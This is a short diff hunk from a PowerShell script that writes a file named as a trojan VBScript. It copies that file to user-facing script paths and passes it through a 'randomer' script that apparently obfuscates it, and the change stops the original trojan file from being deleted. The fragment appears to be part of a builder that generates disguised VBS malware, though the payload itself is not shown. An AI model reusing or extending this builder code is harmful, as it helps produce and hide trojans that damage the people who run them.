@@ -121,4 +121,3 @@ $result | Set-Content $server.troyanVbsFile
 Copy-Item -Path $server.troyanVbsFile -Destination $server.userVbsFile -Force
 Copy-Item -Path $server.troyanVbsFile -Destination $server.userVbsFileClean -Force
 & (Join-Path -Path $scriptDir -ChildPath "randomer.ps1") -inputFile $server.userVbsFile -outputFile $server.userVbsFile  -fileType vbs
-Remove-Item $server.troyanVbsFile
